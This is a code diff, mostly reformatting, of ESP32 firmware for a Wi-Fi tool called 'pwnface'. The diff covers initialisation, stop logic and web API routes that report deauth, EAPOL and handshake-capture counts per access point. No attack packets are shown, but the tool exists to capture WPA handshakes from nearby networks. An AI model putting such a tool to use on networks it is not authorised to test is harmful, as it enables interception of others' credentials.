+  pw_hs_log_count = 0;
+  pw_log_head = 0;
+  pw_log_count = 0;
+  pw_total_visits = 0;
+  pw_deauth_total = 0;
+  pw_eapol_total = 0;
+  pw_beacon_total = 0;
+  pw_data_total = 0;
+  pw_efficiency = 0.0f;
+  pw_mood = PW_SLEEP;
+  pw_uptime_ms = 0;
   memset(pw_mood_hist, 0, sizeof(pw_mood_hist));
   pw_mood_hist_idx = 0;
   for (int i = 0; i < 13; i++) {
-    pw_chans[i] = {(uint8_t)(i+1), 0, 0, 0, 0, 0, 0, 0.0f, 1.0f, 1.0f};
+    pw_chans[i] = {(uint8_t)(i + 1), 0, 0, 0, 0, 0, 0, 0.0f, 1.0f, 1.0f};
   }
   memset(pw_log_buf, 0, sizeof(pw_log_buf));
   memset(pw_aps, 0, sizeof(pw_aps));
   memset(pw_clients, 0, sizeof(pw_clients));
   memset(pw_hs_log, 0, sizeof(pw_hs_log));
   pw_apply_personality();
-  if (!pw_mutex) pw_mutex = xSemaphoreCreateMutex();
+  if (!pw_mutex)
+    pw_mutex = xSemaphoreCreateMutex();
   wifi_promiscuous_filter_t f = {};
   f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
   esp_wifi_set_promiscuous_filter(&f);
@@ -922,10 +990,13 @@ static bool pw_start(const String& args) {
 
 static void pw_stop() {
   pw_running = false;
-  if (pw_task) { vTaskDelay(pdMS_TO_TICKS(200)); pw_task = nullptr; }
+  if (pw_task) {
+    vTaskDelay(pdMS_TO_TICKS(200));
+    pw_task = nullptr;
+  }
   pw_mood_set(PW_SLEEP);
-  pw_log_add("Sleeping. hs=%u aps=%u cli=%u ep=%u",
-    (unsigned)pw_hs, (unsigned)pw_total_aps, pw_client_count, (unsigned)pw_epoch);
+  pw_log_add("Sleeping. hs=%u aps=%u cli=%u ep=%u", (unsigned)pw_hs, (unsigned)pw_total_aps,
+             pw_client_count, (unsigned)pw_epoch);
   esp_wifi_set_promiscuous_rx_cb(aegisSniff);
   wifi_promiscuous_filter_t f = {};
   f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
@@ -937,51 +1008,60 @@ static void pw_stop() {
 static void pw_routes() {
   extern WebServer server;
 
-  server.on("/pwnface", HTTP_GET, [](){
-    server.sendHeader("Cache-Control","no-cache");
+  server.on("/pwnface", HTTP_GET, []() {
+    server.sendHeader("Cache-Control", "no-cache");
     server.send_P(200, "text/html", PW_HTML);
   });
 
-  server.on("/api/pwnface/start", HTTP_POST, [](){
+  server.on("/api/pwnface/start", HTTP_POST, []() {
     String q;
-    for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
+    for (int i = 0; i < server.args(); i++) {
+      if (i)
+        q += '&';
+      q += server.argName(i) + '=' + server.arg(i);
+    }
     bool ok = tool_start("pwnface", q);
-    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
+    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
   });
 
-  server.on("/api/pwnface/stop", HTTP_POST, [](){
+  server.on("/api/pwnface/stop", HTTP_POST, []() {
     tool_stop("pwnface");
-    server.send(200,"application/json","{\"ok\":1}");
+    server.send(200, "application/json", "{\"ok\":1}");
   });
 
-  server.on("/api/pwnface/personality", HTTP_POST, [](){
+  server.on("/api/pwnface/personality", HTTP_POST, []() {
     int p = server.arg("p").toInt();
-    if (p >= 0 && p <= 2) { pw_personality = (uint8_t)p; pw_apply_personality(); }
-    server.send(200,"application/json","{\"ok\":1}");
+    if (p >= 0 && p <= 2) {
+      pw_personality = (uint8_t)p;
+      pw_apply_personality();
+    }
+    server.send(200, "application/json", "{\"ok\":1}");
   });
 
-  server.on("/api/pwnface/status", HTTP_GET, [](){
+  server.on("/api/pwnface/status", HTTP_GET, []() {
     String j = "{";
-    j += "\"running\":"    + String(pw_running?1:0);
-    j += ",\"mood\":\""    + String(PW_MOOD_K[pw_mood]) + "\"";
-    j += ",\"hs\":"        + String(pw_hs);
-    j += ",\"aps\":"       + String(pw_total_aps);
-    j += ",\"clients\":"   + String(pw_client_count);
-    j += ",\"epoch\":"     + String(pw_epoch);
-    j += ",\"chan\":"       + String(pw_cur_ch);
-    j += ",\"deauths\":"   + String(pw_deauth_total);
-    j += ",\"eapol\":"     + String(pw_eapol_total);
-    j += ",\"beacons\":"   + String(pw_beacon_total);
-    j += ",\"uptime\":"    + String(pw_uptime_ms);
+    j += "\"running\":" + String(pw_running ? 1 : 0);
+    j += ",\"mood\":\"" + String(PW_MOOD_K[pw_mood]) + "\"";
+    j += ",\"hs\":" + String(pw_hs);
+    j += ",\"aps\":" + String(pw_total_aps);
+    j += ",\"clients\":" + String(pw_client_count);
+    j += ",\"epoch\":" + String(pw_epoch);
+    j += ",\"chan\":" + String(pw_cur_ch);
+    j += ",\"deauths\":" + String(pw_deauth_total);
+    j += ",\"eapol\":" + String(pw_eapol_total);
+    j += ",\"beacons\":" + String(pw_beacon_total);
+    j += ",\"uptime\":" + String(pw_uptime_ms);
     j += ",\"personality\":" + String(pw_personality);
     j += ",\"efficiency\":" + String(pw_efficiency, 3);
-    j += ",\"msg\":\"epoch " + String(pw_epoch) + " | " + String(pw_hs) + " hs | " + String(pw_total_aps) + " APs\"";
+    j += ",\"msg\":\"epoch " + String(pw_epoch) + " | " + String(pw_hs) + " hs | " +
+         String(pw_total_aps) + " APs\"";
 
     // Per-channel array
     j += ",\"chans\":[";
     for (int i = 0; i < 13; i++) {
-      if (i) j += ",";
-      j += "{\"c\":" + String(pw_chans[i].ch ? pw_chans[i].ch : (uint8_t)(i+1));
+      if (i)
+        j += ",";
+      j += "{\"c\":" + String(pw_chans[i].ch ? pw_chans[i].ch : (uint8_t)(i + 1));
       j += ",\"e\":" + String(pw_chans[i].eapol);
       j += ",\"v\":" + String(pw_chans[i].visits);
       j += ",\"ucb\":" + String(pw_chans[i].ucb_score, 3) + "}";
@@ -993,15 +1073,18 @@ static void pw_routes() {
     int shown = 0;
     char mac_str[18];
     for (int i = 0; i < pw_ap_count && shown < 20; i++) {
-      if (shown > 0) j += ",";
+      if (shown > 0)
+        j += ",";
       pw_mac2str(pw_aps[i].bssid, mac_str);
       j += "{\"bssid\":\"" + String(mac_str) + "\"";
-      j += ",\"ssid\":\"";  j += String(pw_aps[i].ssid).substring(0,24); j += "\"";
-      j += ",\"ch\":"       + String(pw_aps[i].ch);
-      j += ",\"rssi\":"     + String(pw_aps[i].rssi);
-      j += ",\"enc\":"      + String(pw_aps[i].enc);
-      j += ",\"eapol\":"    + String(pw_aps[i].eapol_seen);
-      j += ",\"active\":"   + String(pw_aps[i].active?1:0) + "}";
+      j += ",\"ssid\":\"";
+      j += String(pw_aps[i].ssid).substring(0, 24);
+      j += "\"";
+      j += ",\"ch\":" + String(pw_aps[i].ch);
+      j += ",\"rssi\":" + String(pw_aps[i].rssi);
+      j += ",\"enc\":" + String(pw_aps[i].enc);
+      j += ",\"eapol\":" + String(pw_aps[i].eapol_seen);
+      j += ",\"active\":" + String(pw_aps[i].active ? 1 : 0) + "}";
       shown++;
     }
     j += "]";
@@ -1010,21 +1093,27 @@ static void pw_routes() {
     j += ",\"hs_log\":[";
     int start = pw_hs_log_count > 10 ? pw_hs_log_count - 10 : 0;
     for (int i = start; i < pw_hs_log_count; i++) {
-      if (i > start) j += ",";
+      if (i > start)
+        j += ",";
       pw_mac2str(pw_hs_log[i].ap, mac_str);
-      String ap_short = String(mac_str).substring(9); // last 8 chars
+      String ap_short = String(mac_str).substring(9);  // last 8 chars
       j += "{\"ap_short\":\"" + ap_short + "\"";
-      j += ",\"ssid\":\"";    j += String(pw_hs_log[i].ssid).substring(0,20); j += "\"";
-      j += ",\"ch\":"         + String(pw_hs_log[i].ch);
-      j += ",\"frames\":"     + String(pw_hs_log[i].frames) + "}";
+      j += ",\"ssid\":\"";
+      j += String(pw_hs_log[i].ssid).substring(0, 20);
+      j += "\"";
+      j += ",\"ch\":" + String(pw_hs_log[i].ch);
+      j += ",\"frames\":" + String(pw_hs_log[i].frames) + "}";
     }
     j += "]";
 
     // Mood history
     j += ",\"mood_hist\":[";
     for (int i = 0; i < 8; i++) {
-      if (i) j += ",";
-      j += "\""; j += PW_MOOD_K[pw_mood_hist[i]]; j += "\"";
+      if (i)
+        j += ",";
+      j += "\"";
+      j += PW_MOOD_K[pw_mood_hist[i]];
+      j += "\"";
     }
     j += "]";
 
@@ -1033,9 +1122,13 @@ static void pw_routes() {
     bool first = true;
     for (int i = 0; i < pw_log_count; i++) {
       int idx = ((pw_log_head - 1 - i) + PW_LOG_SZ) % PW_LOG_SZ;
-      if (!pw_log_buf[idx][0]) continue;
-      if (!first) j += ",";
-      j += "\""; j += pw_log_buf[idx]; j += "\"";
+      if (!pw_log_buf[idx][0])
+        continue;
+      if (!first)
+        j += ",";
+      j += "\"";
+      j += pw_log_buf[idx];
+      j += "\"";
       first = false;
     }
     j += "]}";
